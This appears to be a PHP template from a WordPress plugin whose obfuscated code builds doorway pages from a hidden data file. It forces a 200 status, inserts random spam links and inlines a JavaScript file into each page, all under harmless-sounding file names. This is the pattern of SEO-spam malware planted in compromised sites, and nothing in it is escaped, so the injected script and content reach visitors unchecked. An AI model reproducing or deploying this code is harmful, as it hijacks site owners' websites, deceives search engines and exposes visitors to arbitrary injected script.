<?php
$bzfZIPXu = intval(get_query_var('emgvkdmwh'));

if ($bzfZIPXu < 1 || $bzfZIPXu > 4649) return;
$weVf0lom = file(plugin_dir_path(__FILE__).'products-enhanced.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$tARhQ = explode(';', $weVf0lom[$bzfZIPXu]);
if (count($tARhQ) < 2) return;
$rBGyOq = $tARhQ[0];
$ayf3Huql  = $tARhQ[1];
$dMf4Y = $tARhQ[2];
$pduYRlu  = $tARhQ[3];
$aD4NMT = $tARhQ[4];
set_query_var('ibbfsnrsjk', $rBGyOq);

$nUbWTg = '';
$rOFuVEWqtf = plugin_dir_path(__FILE__).'player-cool.php';
if (is_file($rOFuVEWqtf)) {
	$nnrrjwGC = file($rOFuVEWqtf, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($nnrrjwGC);
	shuffle($nnrrjwGC);
	$liIVMlK4sS = mt_rand(2, 5);
	if (count($nnrrjwGC) > $liIVMlK4sS) {
		for ($qDrLB3gjr = 0; $qDrLB3gjr < $liIVMlK4sS; $qDrLB3gjr++) {
			$uCdGf1eO = array_shift($nnrrjwGC);
			$nUbWTg .= '<p><a href="'.$uCdGf1eO.'">'.$uCdGf1eO.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $rBGyOq; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $ayf3Huql . "</p>\n";
				if (strlen($pduYRlu) > 0) echo "<p>" . $pduYRlu . "</p>\n";
				if (strlen($dMf4Y) > 0) echo "<p>" . $dMf4Y . "</p>\n";
				if (strlen($aD4NMT) > 0) echo '<p><a href="#"><img src="'.$aD4NMT.'"></a>' . "</p>\n";
				echo $nUbWTg;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$rMCMzF = plugin_dir_path(__FILE__) . 'compat-awesome.js';
if (is_file($rMCMzF)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($rMCMzF);
	echo '</script>';
}
get_footer();
?>
